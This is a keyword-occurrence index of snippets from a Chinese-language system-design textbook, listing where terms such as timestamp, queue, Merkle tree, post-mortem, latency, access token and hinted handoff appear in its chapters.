  c06_b14.md: ...开始。  **2. 数据建模决策把你锁定。** 一个带复杂外键关系、触发器和存储过程的关系型 schema 很难迁移到 NoSQL。如果建模时假设永远要关系型 join，然后在规模下发现查询模式不匹配，“默认 PostgreSQL”就变成陷阱。这不是...
  c06_b14.md: ...想太多，但足以避开明显错配。目标不是选出完美数据库——而是避免选出明显错误的数据库。  **Q2.** 本章识别了四种 NoSQL 家族，各为不同访问模式优化。但考虑一个真实产品如 Instagram：用户资料（可变属性）、社交图（朋友和关注关系）、...
  c06_b15.md: ...储几乎从来不是_唯一_的数据库——但它们作为补充出现在几乎每个大型系统中，与任何主数据库共存。   ### 本章总结  NoSQL 不是对关系型数据库的否定——它是专业化。四种家族服务四种不同工作负载：  * **文档存储**（MongoDB）擅长灵...

=== timestamp (23 occurrences) ===
  c05_b06.md: ...following_count INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (...
  c05_b06.md: ...like_count  INTEGER DEFAULT 0,         created_at  TIMESTAMP DEFAULT NOW()     );          CREATE TABLE follows (...
  c05_b06.md: ...REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (follower_id, followed_i...
  c05_b06.md: ...REFERENCES posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (user_id, post_id)     )...
  c05_b10.md: ...REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (post_id, user_id)     )...
  c05_b11.md: ...TEXT,         avatar_url  VARCHAR(500),         joined_at   TIMESTAMP DEFAULT NOW()     );          CREATE TABLE posts (...
  c05_b11.md: ...T NOT NULL,         image_urls  TEXT[],         created_at  TIMESTAMP DEFAULT NOW()     );  **设计决策：**...
  c06_b10.md: ...2 步：schema 稳定性：** 稳定——每次位置更新都有 driver_id、latitude、longitude、timestamp。不需要 schema 演进。  **第 3 步：一致性要求：** 请求司机的乘客看到的位置可能是 5 秒前的（上次更新...
  c06_b10.md: ...**第二层：Cassandra（列族存储）存位置历史：**  分区键：`driver_id + date`，聚类键：`timestamp`。这让一名司机一整天的位置历史共置在一台节点上，便于高效时间范围取回（行程回放、ETA 模型训练需要）。  **为什么...
  c06_b11.md: ...tag         VARCHAR(100) NOT NULL,         created_at  TIMESTAMP DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON h...
  c06_b12.md: ...INTEGER REFERENCES users(id),         created_at      TIMESTAMP DEFAULT NOW(),         body            TEXT,         metada...
  c08_b12.md: ...pe": "post.liked",       "event_id": "evt_a7f2b9c1",       "timestamp": "2024-03-15T14:23:01Z",       "actor_user_id": 42,...
  c08_b14.md: ...type": "post.liked",       "event_id": "evt_abc123",       "timestamp": "2024-03-15T14:23:01Z",       "expires_at": null,       "...
  c08_b14.md: ...ssword_reset_email",       "event_id": "evt_def456",       "timestamp": "2024-03-15T14:23:01Z",       "expires_at": "2024-03-15T1...
  c09_b15.md: ...key：       Key:   presence:{user_id}     Value: {last_seen: timestamp, status: "online"}     TTL:   5 minutes (300 seconds)   如果...
  c16_b15.md: ...": {"status": "ok", "used": 45, "max": 200}       },       "timestamp": "2024-01-15T14:47:23Z"     }   HTTP 状态码：  * 200：healthy 或...
  c17_b04.md: ...e for request from 192.168.1.45   **结构化日志：**       {       "timestamp": "2024-01-15T14:47:23.441Z",       "level": "ERROR",...
  c17_b04.md: ...生 10,000 条日志时，它几乎没用。   #### 一条好日志条目的结构  每条结构化日志条目应包含：  1. **Timestamp**——毫秒精度、UTC 时区。来自不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severi...
  c17_b04.md: ...e for request from 192.168.1.45   **结构化日志：**       {       "timestamp": "2024-01-15T14:47:23.441Z",       "level": "ERROR",...
  c17_b04.md: ...生 10,000 条日志时，它几乎没用。   #### 一条好日志条目的结构  每条结构化日志条目应包含：  1. **Timestamp**——毫秒精度、UTC 时区。来自不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severi...
  c25_b03.md: ...river_id}/location     { "lat": 37.7749, "lng": -122.4194, "timestamp": 1714000000 }  位置更新流水线：  1. **负载均衡器**（第 9 章）：把 125 万请求/秒分布...
  c25_b03.md: .../秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，系统维护反向索引：`geohash:{cell}...
  c25_b10.md: ...：`driver:{id}:location` 存 lat（8 字节）、lng（8 字节）、geohash（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 geohash 索引开销（每个司机出现在一个 geohash 集合中）。总存储估算...

=== queue (23 occurrences) ===
  c08_b07.md: ...exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓     Return HTTP 200 "Account created...
  c08_b07.md: ...to user         ↓     (Meanwhile, in the background...)     Queue Consumer: Email Service         ← reads "user.signup" event...
  c08_b07.md: ...mer: Email Service         ← reads "user.signup" event from queue         ← sends welcome email (300ms — doesn't block the us...
  c08_b07.md: ...← sends welcome email (300ms — doesn't block the user)      Queue Consumer: Analytics Service         ← reads "user.signup" e...
  c08_b07.md: ...Analytics Service         ← reads "user.signup" event from queue         ← logs the event (50ms — doesn't block the user)...
  c08_b07.md: ...← logs the event (50ms — doesn't block the user)      Queue Consumer: Contact Notification Service         ← reads "use...
  c08_b07.md: ...tification Service         ← reads "user.signup" event from queue         ← notifies connected friends (200ms — doesn't block...
  c15_b07.md: ...to the database     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此间隙崩溃，支...
  c15_b07.md: ...—没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT INTO...
  c23_b02.md: ..."https://en.wikipedia.org", "https://nytimes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:...
  c23_b02.md: .../en.wikipedia.org", "https://nytimes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:         url =...
  c23_b02.md: ...imes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:         url = queue.dequeue()         page =...
  c23_b02.md: ...seed_urls)          while queue is not empty:         url = queue.dequeue()         page = fetch(url)         links = extract...
  c23_b02.md: ...extract_links(page)         for link in links:             queue.enqueue(link)         store(url, page)  这是对网页图做广度优先搜索，从一组种子...
  c23_b02.md: ...是否在 seen set 中。如果是，跳过。      if url not in seen_set:         queue.enqueue(url)         seen_set.add(url)  100 亿（10 billion）UR...
  c23_b02.md: ..."https://en.wikipedia.org", "https://nytimes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:...
  c23_b02.md: .../en.wikipedia.org", "https://nytimes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:         url =...
  c23_b02.md: ...imes.com", ...]     queue = Queue(seed_urls)          while queue is not empty:         url = queue.dequeue()         page =...
  c23_b02.md: ...seed_urls)          while queue is not empty:         url = queue.dequeue()         page = fetch(url)         links = extract...
  c23_b02.md: ...extract_links(page)         for link in links:             queue.enqueue(link)         store(url, page)  这是对网页图做广度优先搜索，从一组种子...
  c23_b02.md: ...是否在 seen set 中。如果是，跳过。      if url not in seen_set:         queue.enqueue(url)         seen_set.add(url)  100 亿（10 billion）UR...
  c28_b11.md: ...） | 最终——DB 可能落后缓存 | 缓存失败且未写 DB 有丢数据风险 | 高——需要失败恢复 **Message queue (point-to-point)** (Ch 8) | 生产者延迟更高（异步投递） | 至少一次或精确一次（可配置）...
  c28_b11.md: ...（术语译法：一致性（consistency）、负载均衡器（load balancer）、消息队列（message queue）、索引（index）） * * *...

=== merkle (23 occurrences) ===
  c14_b06.md: ...并传播缺失或分歧更新的后台修复过程。在 Cassandra 中，这通过 **repair** 进程完成，使用一种叫 **Merkle tree（默克尔树）** 的数据结构来高效识别副本之间哪些数据不同。  plain 语言：反熵就是系统定期检查副本是否...
  c26_b04.md: ...，写可用性就近乎 100%，无论哪些具体节点宕机。  * * *   ### 26.4 Anti-Entropy——用 Merkle Tree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间收到邻居 hinte...
  c26_b04.md: ...比较副本 A 和 B 的每个键值对。每节点 10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内...
  c26_b04.md: ...值对。每节点 10 亿键，需要传输和比较 10 亿条目——过于昂贵。   #### 定义：Merkle Tree  **Merkle tree**（哈希树）是一种二叉树，每个叶子包含一个数据块（如一个键范围）的哈希，每个内部节点包含其子节点哈希的哈希。...
  c26_b04.md: ...子节点哈希不同，分歧在左半 keyspace。递归进入左子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围...
  c26_b04.md: ...子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较两个副本的 Merkle tree 只需 O(log N) 次哈希比较即可定位分歧键范围，而非 O(N) 次键比较。只有分歧键范围的数据需要传输...
  c26_b04.md: ...围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节点定期与对等节点比较根哈希 3. 若根不同，树比较将分歧缩小到具体键范围 4. 只...
  c26_b06.md: ...储对不同类型数据使用不同 N/W/R 配置。正确的一致性级别始终是数据具体需求的函数——而非系统级设置。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其...
  c26_b06.md: ...。   #### Merkle Tree 与 SocialSnap 数据调和  SocialSnap 分布式键值存储用 Merkle tree 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 pee...
  c26_b06.md: ...e 检测其三副本节点之间的分歧。任何节点故障恢复后，anti-entropy 过程运行，比较恢复节点与其 peer 的 Merkle tree 根。  对 timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的...
  c26_b06.md: ...timeline 缓存：30 分钟节点中断后典型分歧约 10 万（100,000）条收到更新的 timeline 条目。Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到很小的 keyspa...
  c26_b07.md: ...2. **Sloppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分歧检测问题 4. **基于 gossip 的成员管理：** 无...
  c26_b08.md: ...联系哪些节点。不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.** Merkle tree 如何实现高效的副本比较？为什么比比较所有键值对更高效？...
  c26_b09.md: ...**答案：** Merkle tree 是二叉树，叶子包含数据块（键范围）的哈希，内部节点包含子节点哈希的哈希。两个副本先比较根哈希：若相等，副本相...
  c26_b09.md: ...传输全部 N 个键（或至少 N 个哈希值）。10 亿（1 billion）键就是 10 亿（1 billion）次比较。Merkle tree 最多需要 2 × log₂(N) 次哈希比较定位分歧——10 亿键约 60 次。实际传输的修复数据只是分歧子...
  c26_b11.md: ...100 亿（10 billion）键分布在 100 节点（每节点 1 亿（100 million）键）。每个节点维护的 Merkle tree 叶子覆盖 1 万（10,000）键范围。某节点故障后从 1 小时中断恢复，估计该 key range 期间有...
  c26_b11.md: ...后从 1 小时中断恢复，估计该 key range 期间有约 50 万（500,000）键被写入。估算定位分歧范围所需 Merkle tree 比较次数、分歧叶子节点数、修复总数据传输量（假设每个值平均 1KB）。  提示  Merkle tree 高...
  c26_b11.md: ...分歧范围所需 Merkle tree 比较次数、分歧叶子节点数、修复总数据传输量（假设每个值平均 1KB）。  提示  Merkle tree 高度决定比较次数。分歧叶子数取决于 50 万分歧键如何分布在键范围中。  **答案：** Merkle tr...
  c26_b11.md: ...示  Merkle tree 高度决定比较次数。分歧叶子数取决于 50 万分歧键如何分布在键范围中。  **答案：** Merkle tree 结构：每节点 1 亿（100 million）键，叶子覆盖 1 万（10,000）键范围 → 100M /...
  c26_b11.md: ...= 平均每叶 50 个分歧键，因此基本所有 1 万片叶子都分歧（因为叶中任一键写入就会使该叶分歧）。这种广泛分歧场景下，Merkle tree 比较很快发现根分歧、两个子节点都分歧，迅速收敛到“全部分歧”。树比较在 14 次比较（一条路径）内终止，确定...
  c26_b11.md: ...）分歧键 × 1KB = 500 MB。远小于传输全部 1 亿键 × 1KB = 100 GB。即使在大范围分歧情况下，Merkle tree 也通过精确定位哪些键分歧，将传输数据减少 200 倍。...
  c26_b13.md: ...ted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Merkle tree** 使副本修复高效：O(log N) 次比较定位分歧，只传输分歧键范围。  **Gossip 协议** 无需...
  c28_b14.md: ...** (Ch 26) | 低（写到任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功） | 中 **Merkle tree anti-entropy** (Ch 26) | 无查询延迟影响 | 最终（后台修复） | 高（自愈合副本）...

=== mortem (23 occurrences) ===
  c27_b03.md: ...致 45 分钟故障，所有流量被路由到一台服务器。这是 SocialSnap 第一次生产故障，也让团队开始接触 post-mortem（第 28 章详述）。  **技术债务：** 数据库现在成为单一瓶颈——三台应用服务器产生的数据库负载超过单个 Post...
  c27_b13.md: ...推理，创造能经受团队流动性的制度记忆。  第 28 章通过考察塑造系统的人文力量来收尾：深入康威定律、无责备 post-mortem 文化、serverless 与边缘计算，以及最终完成的 权衡矩阵（Tradeoff Matrix）——本书所涵盖一切的...
  c28_b02.md: ...构不匹配的人为划分。反过来读康威定律，可以诊断组织失调。  * * *   ### 28.2 On-Call、Post-Mortem 与无责备文化...
  c28_b03.md: ...on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem  系统事件发生时，人类有一种自然的冲动去找过错方。部署了错误代码的工程师。没注意到警示信号的运营团队。这种冲动可以理解...
  c28_b03.md: ...程师——因此对发生了什么理解最深——如果担心个人后果，就不会完整分享知识。组织失去了学习机会。  **无责备 post-mortem** 是由 SRE 团队（Site Reliability Engineering，Google 发展起来的学科）开创的...
  c28_b03.md: ...Site Reliability Engineering，Google 发展起来的学科）开创的文化实践。原则：post-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mort...
  c28_b03.md: ...rtem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mortem 回答：  1. 发生了什么？（尽可能详细的时间线） 2. 对用户影响是什么？（持续时间、范围、受影响数量） 3. 根本...
  c28_b03.md: ...改进） 5. 什么能预防它？（预防性变更） 6. 行动项是什么？（具体、有人负责、有日期的系统或流程变更）  post-mortem 在组织内广泛分享，行动项被跟踪到完成。目标是制度学习：每次事件都使系统更安全，因为每次事件的教训都被编码进系统。...
  c28_b03.md: ...on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem  系统事件发生时，人类有一种自然的冲动去找过错方。部署了错误代码的工程师。没注意到警示信号的运营团队。这种冲动可以理解...
  c28_b03.md: ...程师——因此对发生了什么理解最深——如果担心个人后果，就不会完整分享知识。组织失去了学习机会。  **无责备 post-mortem** 是由 SRE 团队（Site Reliability Engineering，Google 发展起来的学科）开创的...
  c28_b03.md: ...Site Reliability Engineering，Google 发展起来的学科）开创的文化实践。原则：post-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mort...
  c28_b03.md: ...rtem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mortem 回答：  1. 发生了什么？（尽可能详细的时间线） 2. 对用户影响是什么？（持续时间、范围、受影响数量） 3. 根本...
  c28_b03.md: ...改进） 5. 什么能预防它？（预防性变更） 6. 行动项是什么？（具体、有人负责、有日期的系统或流程变更）  post-mortem 在组织内广泛分享，行动项被跟踪到完成。目标是制度学习：每次事件都使系统更安全，因为每次事件的教训都被编码进系统。...
  c28_b17.md: ...周（2 weeks）。第一周用于阅读：服务大纲、权衡矩阵（Tradeoff Matrix）、过去 6 个月的 post-mortem。第二周与资深工程师配对完成第一次 on-call 轮值。到第二周末，新员工至少参与过一次生产事件——不是作为决策者，而...
  c28_b19.md: ...数据流的一致性——正是第 7 章提到的缓存失效问题，计算机科学中最难的问题之一。  **Q4.** 是什么让 post-mortem “无责备”，为什么这种文化选择比聚焦责备的事件审查产生更好的工程结果？  **答案：** 无责备 post-morte...
  c28_b19.md: ...ortem “无责备”，为什么这种文化选择比聚焦责备的事件审查产生更好的工程结果？  **答案：** 无责备 post-mortem 关注系统条件和流程失败，而非个人错误。它问“什么条件使这次失败成为可能？”而不是“谁犯了错？”无责备：“部署脚本静默失...
  c28_b19.md: ...署到生产。”无责备产生更好结果，因为：(1) 害怕责备的工程师会隐藏信息。在责备文化中，犯错的工程师有动机在 post-mortem 中淡化或掩盖自己的角色。在无责备文化中，他们是最有价值的贡献者——他们拥有最详细的知识。完整信息带来更好的根因分析。(...
  c28_b21.md: ...。退出策略良好。6. 还有谁在规模上运行？TimescaleDB 已被多家大公司大规模使用。公开的案例研究和 post-mortem 可获得。建议：采纳 TimescaleDB。它解决真实问题，故障模式可接受，运营 familiar，退出策略清晰。...
  c28_b21.md: ...了 `posts` 表上的索引，导致每个 feed 查询执行全表扫描。用五个为什么技术追溯根本原因。然后撰写 post-mortem 的行动项，确保每项都处理系统性条件而非归咎于个人。...
  c28_b22.md: ...。根本原因：CI/CD 流水线中没有自动查询计划回归测试；staging 无法验证关键索引查询在迁移后仍高效。post-mortem 行动项：(1) **在 CI/CD 中添加查询计划回归测试**（负责：Platform 团队，期限：2 周）：每次数据...
  c28_b23.md: ...信需求在接口明确稳定时降低。在接口文档、API 版本管理和事件 schema 管理上的投资会带来持续协调减少。post-mortem 实践也在这里有贡献：制度记忆（记录在 post-mortem 和 ADR——Architecture Decision...
  c28_b23.md: ...schema 管理上的投资会带来持续协调减少。post-mortem 实践也在这里有贡献：制度记忆（记录在 post-mortem 和 ADR——Architecture Decision Records 中）意味着新员工不需要为每个决策问 seni...
  c28_b24.md: ...你想构建的架构设计组织。SocialSnap 在微服务迁移前的团队重组就是这一原则的有意应用。  **无责备 post-mortem** 和 on-call 文化决定团队如何从失败中学习。把失败视为系统问题而非个人问题的文化以复利速度积累学习，使每次事...

=== latency (22 occurrences) ===
  c01_b12.md: ...个习惯：**在你接受任何设计“足够好”之前，问问什么证据会改变你的想法。**  在第 2 章，我们将把系统的词汇形式化：latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）和 dura...
  c02_b01.md: ...好的延迟，我在牺牲什么，对我的用户来说这个牺牲值得吗？”  从每个用户真正关心的问题开始：有多快？   ### 2.1 Latency 与 Throughput——速度与容量  想象一条高速公路。汽车从一个城市开到另一个城市。对司机来说重要的是两件事：每...
  c02_b01.md: ...市开到另一个城市。对司机来说重要的是两件事：每辆车开多快（速度），以及每小时能过多少辆车（容量）。它们相关，但独立。  Latency（延迟）和 throughput（吞吐）就是系统中对应的概念。   #### 定义：Latency  **Latency...
  c02_b01.md: ...它们相关，但独立。  Latency（延迟）和 throughput（吞吐）就是系统中对应的概念。   #### 定义：Latency  **Latency（延迟）** 是从请求发出到响应收到之间经过的时间。它是单个操作经历的延迟。  用大白话说：延迟就...
  c02_b01.md: ...Latency（延迟）和 throughput（吞吐）就是系统中对应的概念。   #### 定义：Latency  **Latency（延迟）** 是从请求发出到响应收到之间经过的时间。它是单个操作经历的延迟。  用大白话说：延迟就是你等多久。如果你点击...
  c02_b01.md: ...用大白话说：延迟就是你等多久。如果你点击“加载我的 Feed”，1.2 秒后才有内容出现，延迟就是 1.2 秒。  Latency 通常这样度量：  * **p50（中位数）：** 一半请求比它快，一半比它慢 * **p95：** 95% 的请求比它...
  c02_b01.md: ...p95：** 95% 的请求比它快；最慢的 5% 更慢 * **p99：** 99% 的请求比它快；尾部延迟（tail latency） * **p99.9：** “噩梦尾”——千分之一（1 in 1000）的请求要花这么久  如果中位数很好，p95 和...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一...
  c02_b02.md: ...#### Latency-Throughput 权衡  有趣的地方在这里。Latency 和 throughput 之间存在张力。  假设你有一个数据库，处理查询非常快——每次 1 毫秒——但一次只能处理一个...
  c02_b02.md: ...”，仿佛它们是独立目标。它们是相关的。关系大致如下：       Throughput ≈ Concurrency / Latency   这是 Little's Law（利特尔法则）的非正式表达。如果每个请求花 10 毫秒，同时有 100 个并发请求在...
  c02_b05.md: ...在第 5 章仔细审视它们。   ### 2.5 Partition Tolerance——当网络说谎时  上面的指标——latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durab...
  c02_b06.md: ...对你的具体用例来说这个 tradeoff 值得吗？   ### 2.7 SLI、SLO 与 SLA——把权衡变成承诺  Latency、throughput、availability——到目前为止这些还是抽象指标。真实系统需要把这些指标变成承诺：对用户的...
  c02_b09.md: ...bility（可用性） > Partition Tolerance（分区容错性） > Throughput（吞吐） > Latency（延迟）**  **为什么持久性第一：** 确认后却丢失的写对银行是灾难性失败。如果用户转 1,000 USD，系统说“...
  c02_b11.md: ...| ↑ 提升（队列持久化消息） | ↑ 增加队列管理、监控、重试逻辑 |  箭头方向取决于具体情境的单元格：  * **Latency（延迟）：** 对_生产者_ 来说，延迟降低（写入队列立即返回）。对端到端_操作_ 来说，延迟增加（消费者稍后处理）。所...
  c02_b12.md: ...### 本章总结  系统设计的语言是一门 tradeoff（权衡）的语言。本章引入的六个指标——**latency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durab...
  c18_b04.md: ...含：  * **Chaos Gorilla：** 摧毁整个可用区（availability zone，可用性） * **Latency Monkey：** 在服务调用中引入人为延迟 * **Conformity Monkey：** 检查实例是否符合配置标...
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...
  c28_b11.md: ...#### 第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...
  c28_b14.md: ...#### 第五部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...
  c28_b15.md: ...#### 第六部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact | Operati...

=== access (22 occurrences) ===
  c19_b03.md: ...nap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用...
  c19_b03.md: ...token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 t...
  c19_b03.md: ...n: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access...
  c19_b03.md: ...Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostSchedu...
  c19_b03.md: ...需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 Po...
  c19_b03.md: ...用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON We...
  c19_b03.md: ...用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。...
  c19_b03.md: ...ken 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh...
  c19_b03.md: ...refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b03.md: ...nap 的 token 端点（server-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用...
  c19_b03.md: ...token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authorization: Bearer eyJhbGciOi...`。SocialSnap 验证 t...
  c19_b03.md: ...n: Bearer eyJhbGciOi...`。SocialSnap 验证 token 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access...
  c19_b03.md: ...Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostSchedu...
  c19_b03.md: ...需用户再次登录。  关键洞见：用户密码永远不会与 PostScheduler 共享。PostScheduler 只持有 access token——它是 scoped 的（只授予用户批准的特定权限）且 time-limited 的（会过期）。如果 Po...
  c19_b03.md: ...用户批准的特定权限）且 time-limited 的（会过期）。如果 PostScheduler 被入侵，攻击者只获得 access token——它们可被用户撤销，且不能用来改用户密码。   #### JWT——Token 格式  **JSON We...
  c19_b03.md: ...用户密码。   #### JWT——Token 格式  **JSON Web Tokens（JWT）** 是现代系统中 access token 的主要格式。JWT 是 Base64url 编码、密码学签名的字符串，编码一个 JSON payload。...
  c19_b03.md: ...ken 黑名单（每次请求都要查数据库，失去无状态优势）或使用非常短的过期时间，否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh...
  c19_b03.md: ...refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b14.md: ...nap 验证 JWT 签名并检查 `scope` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器...
  c19_b14.md: ...oken 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap...
  c19_b14.md: ...cted Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的...
  c19_b14.md: ...用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前）仍有效——考虑到短生命周期，这是可接受的。  **OAuth token...

=== handoff (22 occurrences) ===
  c26_b03.md: ...计费使用关系型数据库（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？...
  c26_b03.md: ...（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b03.md: ...计费使用关系型数据库（第 25 章的教训）而非键值存储。  * * *   ### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？...
  c26_b03.md: ...（来自 Amazon 2007 年著名论文，本章设计基于它）：**sloppy quorum** 加 **hinted handoff**。...
  c26_b04.md: ...并把 hinted 数据发送给它。A 收到 hinted 数据后变最新，B 丢弃其 hint。这就是 **hinted handoff**：B 为 A 临时保存数据，A 回来后再交还。  plain 语言：当某键的合法拥有者不可用时，邻居临时持有该键并贴...
  c26_b04.md: ...ree 修复副本  故障和恢复后，副本可能分歧。节点 A 有 100 万键，离线 2 小时，期间收到邻居 hinted handoff 数据，但仍可能丢失离线期间写入且未被 hinted handoff 覆盖的键。  如何高效检测和修复两个副本之间的分歧...
  c26_b04.md: ...万键，离线 2 小时，期间收到邻居 hinted handoff 数据，但仍可能丢失离线期间写入且未被 hinted handoff 覆盖的键。  如何高效检测和修复两个副本之间的分歧？  朴素方法：比较副本 A 和 B 的每个键值对。每节点 10 亿...
  c26_b04.md: ...较将分歧缩小到具体键范围 4. 只传输并合并分歧键范围  这种持续的背景修复过程确保节点故障、网络分区或 hinted handoff 导致的临时分歧在有限时间内解决——**anti-entropy interval**，通常配置为数分钟。  * * *...
  c26_b05.md: ...试后，peer 把该节点标记为“可疑”。若多个 peer 报告同一节点可疑，集群标记它宕机并开始对其键做 hinted handoff。  Gossip 协议也传播 schema 变更、配置更新和环修改——任何需要最终一致地到达所有节点的集群级状态。...
  c26_b06.md: ...重要（写时扇出必须对 5000 万（50 million）用户快速完成）。Sloppy quorum 加 hinted handoff 保证节点故障期间的高写可用性——timeline 即使在部分故障时也必须可写。  **位置追踪**（拼车服务，第 25...
  c26_b07.md: .... **带虚拟节点的一致性哈希：** 解决数据分布与再平衡问题 2. **Sloppy quorum 与 hinted handoff：** 解决节点故障期间的写可用性问题 3. **Merkle tree anti-entropy：** 高效解决副本分...
  c26_b08.md: ...看到最新写。用于搜索 posting 缓存和会话存储，因为陈旧有用户可见后果。  **Q3.** 什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某键的标准节点 A...
